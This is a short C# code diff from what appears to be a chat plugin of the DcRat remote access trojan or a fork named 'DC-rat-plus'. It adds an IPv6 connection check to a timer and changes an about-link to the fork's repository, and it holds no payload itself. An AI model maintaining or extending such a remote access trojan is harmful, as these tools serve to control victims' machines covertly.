@@ -25,7 +25,7 @@ namespace Plugin
 
         private void Timer1_Tick(object sender, EventArgs e)
         {
-            if (!Connection.IsConnected)
+            if (!Connection.IsConnected && !Connection.IsConnectedV6)
             {
                 Packet.GetFormChat.Invoke((MethodInvoker)(() =>
                 {
@@ -62,7 +62,7 @@ namespace Plugin
 
         private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            Process.Start("https://github.com/qwqdanchun/DcRat");
+            Process.Start("https://github.com/BoheSama1999/DC-rat-plus");
         }
     }
 }
